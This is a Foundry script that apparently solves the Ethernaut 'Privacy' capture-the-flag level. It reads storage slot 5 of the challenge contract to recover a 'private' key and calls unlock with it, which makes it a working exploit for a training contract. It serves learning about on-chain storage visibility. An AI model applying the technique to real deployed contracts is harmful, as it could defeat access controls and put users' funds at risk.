// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here

contract PrivacySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x131c3249e115491E83De375171767Af07906eA36;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        // https://dev.to/web3_ruud/advance-solidity-assembly-storage-slots-part-2-197e
        // 固定長度的陣列 會直接存放在 storage slot 的接下來的位置 data 是 slot3 要取得 data[2] 就是 slot5
        bytes32 key = vm.load(challengeInstance, bytes32(uint(5)));
        (bool success, ) = challengeInstance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(key)));
        require(success, "call failed");


        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(12));
    }
}
